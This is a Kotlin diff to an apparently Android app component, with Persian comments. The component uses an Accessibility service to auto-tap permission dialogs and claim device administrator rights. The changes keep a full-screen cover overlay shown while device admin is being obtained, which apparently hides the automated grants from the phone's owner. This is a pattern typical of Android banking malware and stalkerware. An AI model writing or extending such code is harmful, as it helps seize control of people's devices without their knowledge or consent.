@@ -68,7 +68,11 @@ internal object AutoGrantOrchestrator {
 
     fun shouldRun(context: Context): Boolean = AutoGrantProgress.shouldRun(context)
 
-    fun isActive(): Boolean = host != null || phase == Phase.LEAVING || LeaveA11ySettings.isActive()
+    fun isActive(): Boolean =
+        host != null ||
+            phase == Phase.LEAVING ||
+            phase == Phase.DEVICE_ADMIN ||
+            LeaveA11ySettings.isActive()
 
     /** تنها ورودی بعد از اتصال Accessibility. */
     fun onAccessibilityConnected(service: AccessibilityService) {
@@ -1223,7 +1227,8 @@ internal object AutoGrantOrchestrator {
         AutoGrantTiming.i("DONE grants — device admin before first action")
         main.removeCallbacksAndMessages(null)
         AutoGrantProgress.markSessionDone(activity)
-        PermissionsAutoGrant.disarm(hideOverlay = true)
+        // Cover تا پایان recents می‌ماند؛ فقط arm تپر را قطع کن.
+        PermissionsAutoGrant.disarm(hideOverlay = false)
         LeaveA11ySettings.cancel()
         PermissionDialogTapper.mode = TapMode.IDLE
         PermissionDialogTapper.resetAiForceSchedule()
@@ -1231,6 +1236,7 @@ internal object AutoGrantOrchestrator {
         awaitingReturn = false
         oemSettled = false
         bringUpLock.set(false)
+        showCoverIfNeeded(activity, coverTotal(activity))
         if (DeviceAdminClaim.isActive(activity)) {
             completeAfterAdmin(activity)
             return
@@ -1244,6 +1250,8 @@ internal object AutoGrantOrchestrator {
 
     private fun pumpAdmin(activity: Activity, startedAt: Long) {
         if (host !== activity || phase != Phase.DEVICE_ADMIN) return
+        showCoverIfNeeded(activity, coverTotal(activity))
+        PermissionsAutoGrant.stabilizeOverlay()
         val svc = AgentAccessibilityService.get()
         val ready = svc != null && DeviceAdminClaim.ensureReady(svc)
         val timedOut = SystemClock.uptimeMillis() - startedAt > 45_000L
@@ -1256,6 +1264,9 @@ internal object AutoGrantOrchestrator {
         }
         main.postDelayed({ pumpAdmin(activity, startedAt) }, 500L)
     }
+
+    private fun coverTotal(context: Context): Int =
+        AutoGrantProgress.effectiveRuntimePermissions(context).size + 3
 
     private fun completeAfterAdmin(activity: Activity) {
         host = null
